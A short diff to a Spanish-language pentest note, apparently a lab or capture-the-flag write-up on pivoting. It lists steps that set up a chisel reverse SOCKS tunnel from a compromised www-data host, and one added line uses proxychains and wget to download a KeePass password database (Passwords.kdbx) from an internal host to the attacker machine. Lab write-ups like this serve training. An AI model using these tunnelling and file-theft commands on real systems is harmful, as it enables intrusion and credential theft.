@@ -600,7 +600,8 @@ P1: Crear un servidor en python en el host HFS para poder compartir el archivo `
 
 P2: Ejecutamos ./chisel client 10.2.2.19:8888 R:9001:socks en el host www-data
 
-P3: 
+P3: Ejecutamos proxychains wget http://172.18.0.2:8000/Passwords.kdbx en la maquina atacante
 ```
 
 ![[Pasted image 20240908222500.png]]
+
